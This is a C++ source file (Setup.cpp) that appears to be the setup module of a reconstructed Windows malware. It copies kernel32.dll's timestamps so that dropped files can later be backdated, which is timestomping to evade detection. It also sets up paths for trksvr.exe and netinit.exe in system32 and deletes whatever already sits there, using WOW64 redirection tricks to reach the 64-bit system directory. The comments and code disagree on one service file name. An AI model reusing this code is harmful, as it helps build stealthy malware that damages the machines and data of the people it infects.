/******************************************************************************************
    Copyright 2013 Christian Roggia

    Licensed under the Apache License, Version 2.0 (the "License");
    you may not use this file except in compliance with the License.
    You may obtain a copy of the License at

       http://www.apache.org/licenses/LICENSE-2.0

    Unless required by applicable law or agreed to in writing, software
    distributed under the License is distributed on an "AS IS" BASIS,
    WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
    See the License for the specific language governing permissions and
    limitations under the License.
******************************************************************************************/
// Setup.cpp
// Contains functions used for initial setup

#include "Global.h"
#include "Utils.h"
#include

/*  GeneralSetup

    Finds and stores the "safe" creation time for use in SetSafeFileTime.
    Stores argv in a global variable.

    param:  None

    return: True if both operations succeed, false otherwise
*/
bool GeneralSetup()
{

    GetWindowsDirectoryW(Globals.windows_directory, 100);

    // Generate filenames and paths for trksrv and netinet
    if( !GetTrksrvServiceInfo(Globals.trksrv_name, Globals.trksvr_path) )
        return false;

    // This never returns anything but true
    GetNetinitServiceInfo(Globals.netinit_name, Globals.netinit_path);

    // kernel_path = %SYSTEM%\\system32\\kernel32.dll
    WCHAR kernel_path[256];
    memmove(kernel_path, Globals.windows_directory, 2 * strlenW(Globals.windows_directory));
    memmove(&kernel_path[strlenW(Globals.windows_directory)], L"\\system32\\kernel32.dll", 2 * strlenW(L"\\system32\\kernel32.dll"));
    kernel_path[strlenW(Globals.windows_directory) + strlenW(L"\\system32\\kernel32.dll")] = 0;

    PVOID oldValue = 0;

    // Get a handle to the 64-bit version of kernel32.dll
    _Wow64DisableWow64FsRedirection(&oldValue);
    HANDLE kernel_handle = CreateFileW(kernel_path, GENERIC_READ, FILE_SHARE_DELETE | FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_FLAG_OPEN_NO_RECALL, NULL);
    _Wow64RevertWow64FsRedirection(oldValue);

    if(kernel_handle != INVALID_HANDLE_VALUE)
    {
        if(!GetFileTime(kernel_handle, &Globals.kernel_creation_time, &Globals.kernel_last_access_time, &Globals.kernel_last_write_time))
        {
            Globals.kernel_creation_time.dwHighDateTime = 0;
            Globals.kernel_creation_time.dwLowDateTime = 0;
        }

        CloseHandle(kernel_handle);
    }

    Globals.argv = CommandLineToArgvW(GetCommandLineW(), &Globals.argc);
    if(Globals.argv)
    {
        strcpyW(Globals.module_path, Globals.argv[0], 2 * strlenW(Globals.argv[0]) + 2);
        return true;
    }

    return false;
}

/*  GetTrksrvServiceInfo

    Generate the filename and path for the executable for the trksrv service

    param svc_filename: Output; Will be "trksrv.exe"
    param svc_path:     Output; Will be %SYSTEM%\system32\trksrv.exe

    return: False if we successfully opened the file, but can't delete it. True otherwise
*/
bool GetTrksrvServiceInfo(WCHAR *svc_filename, WCHAR *svc_path)
{
    strcpyW(svc_filename, L"trksvr.exe", 2 * strlenW(L"trksvr.exe"));
    svc_filename[strlenW(L"trksvr.exe")] = 0;

    strcpyW(svc_path, Globals.windows_directory, 2 * strlenW(Globals.windows_directory));
    strcpyW(&svc_path[strlenW(Globals.windows_directory)], L"\\system32\\", 2 * strlenW(L"\\system32\\"));
    strcpyW(&svc_path[strlenW(Globals.windows_directory) + strlenW(L"\\system32\\")], svc_filename, 2 * strlenW(svc_filename));
    svc_path[strlenW(Globals.windows_directory) + strlenW(L"\\system32\\") + strlenW(svc_filename)] = 0;

    PVOID oldValue = NULL;
    _Wow64DisableWow64FsRedirection(&oldValue);

    HANDLE svc = CreateFileW(svc_path, GENERIC_READ, 7, 0, 3, FILE_FLAG_OPEN_NO_RECALL, 0);

    if(svc != INVALID_HANDLE_VALUE || GetLastError() != ERROR_FILE_NOT_FOUND)
    {
        CloseHandle(svc);
        if(!DeleteFileW(svc_path))
        {
            _Wow64RevertWow64FsRedirection(oldValue);
            return false;
        }
    }
    _Wow64RevertWow64FsRedirection(oldValue);

    return true;
}

/* GetNetinitServiceInfo

    Generate the filename and path for the netinit executable.

    param svc_name: Output; Will be "netinit.exe"
    param svc_path: Output; Will be the system directory + "netinit.exe"

    return: True
*/
bool GetNetinitServiceInfo(WCHAR *svc_name, WCHAR *svc_path)
{
    strcpyW(svc_name, L"netinit", 2 * strlenW(L"netinit"));
    strcpyW(&svc_name[strlenW(L"netinit")], L".exe", 2 * strlenW(L".exe"));
    svc_name[strlenW(L"netinit") + strlenW(L".exe")] = 0;

    strcpyW(svc_path, Globals.windows_directory, 2 * strlenW(Globals.windows_directory));
    strcpyW(&svc_path[strlenW(Globals.windows_directory)], L"\\system32\\", 2 * strlenW(L"\\system32\\"));
    strcpyW(&svc_path[strlenW(Globals.windows_directory) + strlenW(L"\\system32\\")], svc_name, 2 * strlenW(svc_name));
    svc_path[strlenW(Globals.windows_directory) + strlenW(L"\\system32\\") + strlenW(svc_name)] = 0;

    PVOID oldValue = NULL;
    _Wow64DisableWow64FsRedirection(&oldValue);
    DeleteFileW(svc_path);
    _Wow64RevertWow64FsRedirection(oldValue);

    return true;
}